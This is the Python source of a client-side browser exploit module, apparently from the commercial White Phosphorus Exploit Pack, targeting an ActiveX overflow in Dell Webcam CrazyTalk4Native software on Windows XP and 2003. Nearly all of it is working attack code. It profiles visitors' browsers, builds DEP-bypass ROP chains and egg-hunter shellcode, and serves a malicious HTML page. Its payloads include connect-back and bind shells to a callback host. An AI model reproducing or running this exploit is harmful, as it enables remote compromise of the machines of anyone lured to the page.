
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


NAME = "Dell Webcam Bundled Software CrazyTalk4Native ActiveX Overflow"
DESCRIPTION = "Exploits an overflow in the Dell Webcam CrazyTalk4Native ActiveX"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Dell'
DOCUMENTATION["Date public"] = "2012-03-19"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/80205"
DOCUMENTATION["Notes"] = """
This is a browser based client-side exploit - use it via httpserver.
If you choose to host the exploit file on an independandant webserver you must include any associated files as well.
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a browser based client-side exploit - use it via httpserver.
If you choose to host the exploit file on an independandant webserver you must include any associated files as well.

------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Dell Webcam Bundled Software CrazyTalk4Native ActiveX Overflow
------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP Universal
1: Windows 2003 Universal

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_dell_webcam_crazytalk4native/wp_dell_webcam_crazytalk4native.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP Universal (DEP)", (0x00000000), [WINALL]],
    1 : ["Windows 2003 Universal (DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit, httpclientside):
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]
    
    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.encode_printable = True
        self.alignstack = True
        self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x28\x29\x2f\x3c\x3e\x5c"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"          
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        """
        Check for IE
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0]
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:      
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        self.wp_getShellcodeType()
        
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def buildBypass(self, size=2200):
        # MFC42.dll
        size += 8
        depBypass = pack('<L', 0x6C1D3812) # pop eax; pop edi; pop esi; pop ebx; pop ebp; pop ecx;
        depBypass += pack('<L', 0xFFFFFFC0) # eax -> edx
        depBypass += pack('<L', 0x6C171245) # edi - ret
        depBypass += pack('<L', 0x780C3601) # esi - mov eax, [eax]
        depBypass += wp_randomstring(4) # ebx - padding
        depBypass += pack('<L', 0x6C1BB950) # ebp - call eax
        depBypass += pack('<L', 0x6C24D614) # ecx - flNewProtect
        
        depBypass += pack('<L', 0x6C1D7C45) # neg eax
        depBypass += pack('<L', 0x6C17667D) # xchg eax, ebx; xor eax, C4830003; or al, 0f6
        depBypass += pack('<L', 0x6C17260F) # xor edx, edx
        depBypass += pack('<L', 0x6C1A9D4E) # add edx, ebx
        depBypass += wp_randomstring(4)
        depBypass += pack('<L', 0x6C17157C) # pop eax
        depBypass += wp_randomstring(16)
        
        # set ebx
        while hasbadchar((pack("<i", -size)), self.badstring):
            size += 1
        depBypass += pack("<i", -size)      # eax - dwSize -> ebx
        depBypass += pack('<L', 0x6C1D7C45) # neg eax
        depBypass += pack('<L', 0x6C17667D) # xchg eax, ebx; xor eax, C4830003; or al, 0f6
        
        # set eax for vp
        depBypass += pack('<L', 0x6C17157C) # pop eax
        depBypass += pack('<L', 0x6C20D2C0) # VP
        depBypass += pack('<L', 0x6C19C5CE) # pushad
        depBypass += pack('<L', 0x6C1E0C62) # push esp
        depBypass += wp_randomstring(4)
        return depBypass
        
    def makefileWin2k3(self):
        searchcode = wp_SearchCode(True)
        
        self.shellcode = self.shellcode[:17] + '\x8b\xe0' + self.shellcode[19:]
        
        payload = wp_randomstring(212)
        payload += pack('<L', 0x6C1711F3) # ret
        payload += wp_randomstring(12)
        payload += pack('<L', 0x6C1D0EF0) # add esp,1c - MFC42.dll
        payload += wp_randomstring(76)
        payload += self.buildBypass(len(searchcode)+8)
        payload += searchcode
        payload += wp_randomstring(2560)
        payload += 'c00kc00k'
        payload += self.buildBypass(len(self.shellcode)+12)
        payload += self.shellcode
        payload += wp_randomstring(8192-len(payload))
        
        filedata="""<html>
<object classid='clsid:13149882-F480-4F6B-8C6A-0764F75B99ED' id='target'/></object>
<script language='javascript'>
arg1 = "PAYLOAD";
target.BackImage(arg1);
</script>
</html>
"""
        filedata = filedata.replace('PAYLOAD', payload)
        return filedata
    
            
    def makefileWinXP(self):
        searchcode = wp_SearchCode(True)
        
        # remove 0x5c from searchcode by replacing push eax; pop esp w/ mov esp, eax
        self.shellcode = self.shellcode[:17] + '\x8b\xe0' + self.shellcode[19:]
        
        payload = wp_randomstring(213)
        payload += pack('<L', 0x6C18D930) # ret 1
        payload += wp_randomstring(12)
        payload += pack('<L', 0x6C1D0EF0) # add esp,1c - MFC42.dll
        payload += wp_randomstring(76)
        payload += self.buildBypass(len(searchcode)+8)
        payload += searchcode
        payload += wp_randomstring(2560)
        payload += 'c00kc00k'
        payload += self.buildBypass(len(self.shellcode)+12)
        payload += self.shellcode
        payload += wp_randomstring(8192-len(payload))
        
        filedata="""<html>
<object classid='clsid:13149882-F480-4F6B-8C6A-0764F75B99ED' id='target'/></object>
<script language='javascript'>
arg1 = "PAYLOAD";
target.BackImage(arg1);
</script>
</html>
"""
        filedata = filedata.replace('PAYLOAD', payload)
        return filedata
    
    def makefile(self,osversion):
        if osversion == "Windows XP":
            self.log('WP> Serving Windows XP exploit')
            return self.makefileWinXP()
        if osversion == "Windows 2003":
            self.log('WP> Serving Windows 2003 exploit')
            return self.makefileWin2k3()
                 
        # Default to XP         
        self.log('WP> Serving Windows XP exploit')     
        return self.makefileWinXP(browser)

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')   
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile(osversion)
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def run(self):
        filedata=self.makefile("Windows XP")
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

